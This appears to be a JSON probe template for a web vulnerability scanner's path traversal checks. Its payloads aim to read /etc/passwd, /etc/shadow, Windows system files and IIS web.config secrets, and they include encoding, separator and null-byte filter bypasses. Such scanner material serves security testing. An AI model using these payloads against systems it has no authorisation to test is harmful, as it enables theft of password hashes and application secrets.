{
  "category": "path_traversal",
  "contexts": {
    "linux": {
      "description": "Path traversal probes targeting Linux/Unix file systems via common web stacks",
      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Django"],
      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
      "probes": [
        {
          "payload": "../../../etc/passwd",
          "description": "Classic three-level path traversal to /etc/passwd on Linux",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "/etc/passwd",
          "description": "Absolute path injection to /etc/passwd",
          "matchers": [
            {"type": "word", "words": ["root:x:0"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "....//....//....//etc/passwd",
          "description": "Double-dot slash bypass for path traversal filters",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "description": "URL-encoded path traversal to /etc/passwd",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "../../../etc/shadow",
          "description": "Path traversal to /etc/shadow (shadow password file)",
          "matchers": [
            {"type": "regex", "pattern": "\\$[156y]\\$[^:]+:[^:]+"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        }
      ]
    },
    "windows": {
      "description": "Path traversal probes targeting Windows file systems via IIS/ASP.NET",
      "tech_match": ["IIS", "ASP.NET"],
      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
      "probes": [
        {
          "payload": "..\\..\\..\\windows\\win.ini",
          "description": "Windows backslash path traversal to win.ini",
          "matchers": [
            {"type": "word", "words": ["[extensions]", "for 16-bit"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "..\\..\\..\\boot.ini",
          "description": "Windows path traversal to boot.ini",
          "matchers": [
            {"type": "word", "words": ["boot loader", "[operating systems]"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "..%5c..%5c..%5cwindows%5cwin.ini",
          "description": "URL-encoded backslash path traversal to win.ini",
          "matchers": [
            {"type": "word", "words": ["[extensions]", "for 16-bit"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "C:\\windows\\win.ini",
          "description": "Absolute Windows path injection",
          "matchers": [
            {"type": "word", "words": ["[extensions]", "for 16-bit"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        }
      ]
    },
    "encoding_bypass": {
      "description": "Path traversal filter bypasses using double encoding, overlong UTF-8, and mixed-separator tricks from HackTricks",
      "tech_match": ["Apache", "Nginx", "PHP", "Tomcat", "Java"],
      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
      "probes": [
        {
          "payload": "%252e%252e%252fetc/passwd",
          "description": "Double URL-encoded traversal — %25 decodes to %, then second pass decodes %2e to . and %2f to /",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "..%c0%afetc/passwd",
          "description": "Overlong UTF-8 encoding of / (0xc0 0xaf) — bypasses decoders that only check standard %2f",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "....//....//....//etc/passwd",
          "description": "Double-dot double-slash bypass — after stripping ../ the remaining ../  still traverses",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "..;/etc/passwd",
          "description": "Semicolon bypass targeting Tomcat — Tomcat treats semicolon as path parameter separator, allowing traversal past it",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "..\\/etc/passwd",
          "description": "Backslash-forward-slash mixed separator — some Windows-ported parsers normalise both separators",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 65,
          "variables": {}
        }
      ]
    },
    "null_byte": {
      "description": "Null byte injection for path traversal — terminates strings early to bypass extension and suffix checks",
      "tech_match": ["PHP", "Apache", "Nginx"],
      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
      "probes": [
        {
          "payload": "../../../etc/passwd%00.jpg",
          "description": "Null byte extension bypass — %00 terminates the C string, stripping the .jpg suffix before file open",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "../../../etc/passwd%00",
          "description": "Null byte path terminator — nullifies any suffix appended by the application after the parameter",
          "matchers": [
            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {}
        }
      ]
    },
    "windows_specific": {
      "description": "Additional Windows-specific path traversal targets — hosts file and IIS web.config",
      "tech_match": ["IIS", "ASP.NET"],
      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
      "probes": [
        {
          "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
          "description": "Windows hosts file path traversal — loopback and domain entries confirm read access",
          "matchers": [
            {"type": "word", "words": ["127.0.0.1", "localhost"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "..\\..\\..\\inetpub\\wwwroot\\web.config",
          "description": "IIS web.config traversal — connection strings and app secrets confirm sensitive file read",
          "matchers": [
            {"type": "word", "words": ["connectionString", "appSettings", "<configuration>"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        }
      ]
    }
  }
}
